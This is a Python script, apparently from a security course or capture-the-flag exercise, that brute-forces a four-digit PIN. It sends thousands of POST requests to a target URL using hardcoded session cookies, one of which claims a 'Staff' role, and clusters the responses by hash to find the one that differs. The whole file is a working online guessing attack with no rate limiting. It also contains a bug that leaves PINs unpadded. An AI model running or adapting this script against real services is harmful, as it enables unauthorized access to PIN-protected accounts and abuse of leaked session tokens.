#!/usr/bin/python  
import sys  
import time
import os
import requests
import zlib

#import requests-futures
from baseconv import base62
from etaprogress.progress import ProgressBar


def main():
	PROGRAM_NAME = "riveSafe"
	HOW_TO = """transport.wa.gov.au/mediaFiles/licensing/DVS_DL_B_DriveSafeFull_h.pdf
		In the meantime, enjoy mixtape: https://youtu.be/8zH2JP4LgaE
	"""
	
	if len(sys.argv) != 2:
		print(PROGRAM_NAME+" "+"Awaits you!")
		print("How to:")
		print(HOW_TO)
		print("USAGE: python "+PROGRAM_NAME+".py <url>")
		print("For example: python "+PROGRAM_NAME+".py http://unsw.edu.au")
	else:
		# init
		# https://stackoverflow.com/a/16060908
		
		URL = str(sys.argv[1])
		
		logname = PROGRAM_NAME+"_"+str(int(time.time()))+".log"
		log = open(logname, "a+")
		
		cookies = {
			"zid": "z5214048",
			"token": "ef992f23c1bbeeae8806204966c53e5b4207fb15d298f1cf269873a3d14f543f",
			"session": "eyJyb2xlIjoiU3RhZmYiLCJ1c2VybmFtZSI6IjEifQ.D3p-hQ.zv0SaZ_fsIUQh-WNkvjUyHx0c1k"
		}

		min = 0
		max = 9999
		length = 4
		
		work = max-min+1
		bar = ProgressBar(work, max_width=40)
		
		# print for user
		print(PROGRAM_NAME+" initialised")
		print("URL @ "+URL)
		print("stdout will be logged to "+logname)
		print("the intel will start in 3s")
		# allow user to change mind
		time.sleep(3)
		
		#payload		
		for i in range(work):		
			# https://stackoverflow.com/a/17323913
			k=i+1
			k_string = str(k) 
			k_string.zfill(length)
			
			#enter input
			post = {
				"pin": k_string
			}
			
			r = requests.post(URL, cookies=cookies, data=post)
						
			#get output
			txt = r.text
			
			#process
			
			# https://docs.python.org/3/library/zlib.html SAYS
			#'An Adler-32 checksum is almost as reliable as a CRC32 but can be computed much more quickly'
			#'Changed in version 3.0: Always returns an unsigned value' => GOOD
			txt_hash = toHexCustom(zlib.adler32(txt.encode('utf-8')))
			
			# write to payload listings
			f_payload = open("pay_"+txt_hash+".txt", "a+")
			f_payload.write(k_string+"\n")
			f_payload.close()
			
			# if no transcription => first time resp encountered
			if not(os.path.isfile("plain_"+txt_hash+".txt")):
				# write to plaintext transcription
				f_plain = open("plain_"+txt_hash+".txt", "w+", encoding="utf-8")
				f_plain.write(txt)
				f_plain.close()
				# now log stuff
				whatToLog = "[N]"+k_string+"; New hash found! Check "+txt_hash+" ("+str(r.status_code)+")"
				
				log.write(whatToLog+"\n")
				print(whatToLog)
			
			# if hash already encountered
			else:
				# boring log, what else to do
				whatToLog = "[B]"+k_string+": "+txt_hash+" ("+str(r.status_code)+")"
				
				log.write(whatToLog+"\n")
				print(whatToLog)
			
			bar.numerator = i
			print(str(bar))
			#sys.stdout.flush()
			
			#time.sleep(SLEEP_TIME/1000)
		
		#payload (for-loop) over
		whatToLog = "Fin"
				
		log.write(whatToLog+"\n")
		print(whatToLog)
		
		log.close()


def toHexCustom(dec): 
	return str(hex(dec).split('x')[-1])	

if __name__ == '__main__':
	main()